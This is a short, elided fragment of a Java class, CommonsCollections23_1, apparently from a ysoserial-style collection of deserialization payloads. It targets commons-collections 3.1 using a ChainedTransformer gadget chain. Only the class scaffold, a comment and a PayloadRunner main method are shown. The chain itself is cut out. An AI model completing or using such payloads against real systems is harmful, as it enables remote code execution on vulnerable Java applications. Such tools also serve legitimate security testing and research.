...
/*
    ...
    // The only difference from this chain is that the ChainedTransformer is called instead of the InvokerTransformer.
 */

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.apache.commons:commons-collections:3.1"})
@Authors({"BadagliaccaDaniele"})
public class CommonsCollections23_1 implements ObjectPayload<ReferenceMap> {
    ...
    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections23_1.class, args);
    }
